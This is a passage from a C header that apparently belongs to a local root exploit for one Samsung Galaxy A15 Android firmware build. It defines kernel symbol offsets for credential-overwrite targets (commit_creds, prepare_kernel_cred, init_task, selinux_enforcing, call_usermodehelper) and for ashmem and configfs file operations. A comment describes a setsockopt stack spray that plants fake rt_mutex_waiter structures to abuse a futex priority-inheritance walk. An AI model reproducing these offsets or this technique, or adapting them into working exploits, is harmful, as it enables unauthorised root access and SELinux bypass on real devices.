...
#define BUILD_VARIANT_LABEL "a15x-S156VUDSCEZG1-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "a15x-S156VUDSCEZG1-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
 "samsung/a15xtfn/a15x:16/BP4A.251205.006/S156VUDSCEZG1:user/release-keys"
#endif
...
#define INIT_TASK_OFF             0x02a49080ULL
#define PREPARE_KERNEL_CRED_OFF   0x0011e3c8ULL
#define COMMIT_CREDS_OFF          0x00120104ULL
#define OVERRIDE_CREDS_OFF        0x0011f1dcULL

#define ROOT_TASK_GROUP_OFF       0x02af9ac0ULL
#define SELINUX_ENFORCING_OFF     0x02bcded8ULL
#define KMALLOC_CACHES_OFF        0x01f1ea48ULL
#define ANON_PIPE_BUF_OPS_OFF     0x01d5e5e0ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x028e07d8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00104598ULL

#define ASHMEM_FOPS_OFF           0x01ec7ba0ULL
#define ASHMEM_MISC_FOPS_OFF      0x02a40ea8ULL
#define ASHMEM_IOCTL_OFF          0x01059670ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x01059cccULL
#define ASHMEM_MMAP_OFF           0x01059d24ULL
#define ASHMEM_OPEN_OFF           0x0105a004ULL
#define ASHMEM_RELEASE_OFF        0x0105a09cULL
#define ASHMEM_SHOW_FDINFO_OFF    0x0105a1b8ULL

#define CONFIGFS_READ_ITER_OFF    0x005d22a8ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005d2cd0ULL
#define COPY_SPLICE_READ_OFF      0x00525eb8ULL
#define NOOP_LLSEEK_OFF           0x004ba3e8ULL
 ...
 * do_ipv6_setsockopt+0x130).  The naive chain model (entry 0x1e0 +
 * __arm64_sys_setsockopt 0x10 + __sys_setsockopt 0x70 + sock_common_setsockopt
 * 0x10 + udpv6_setsockopt 0x40 + do_ipv6_setsockopt 0x2c0 = 0x60 stp frame +
 * 0x260 sub frame) puts the buffer near T-0x530, but the live kernel adds
 * tracepoint frames on this path (perf_tp_event in the popped-stack content
 * of every setsockopt crash dump), so the single-offset guesses
 * (0x40/0x18/0x78) all missed: the node kept its original futex data and
 * the PI walk read waiter->lock == 0 at T-0x4b8.  The spray therefore
 * plants the complete waiter word set repeatedly across the whole 0x108
 * buffer (one image every 0x10) so any node position inside the buffer
 * lands in a full rt_mutex_waiter image; the handler then fails validation
 * (buffer[0x8] != 0xa and buffer[0x88] != 0xa, do_ipv6_setsockopt+0xce8)
 * and returns -EADDRNOTAVAIL (-99); the planted words persist on the
 * popped stack.
 */
...
#define P0_FINGERPRINT_HEADER "targets/a15x-S156VUDSCEZG1/p0_fingerprint.h"
#endif
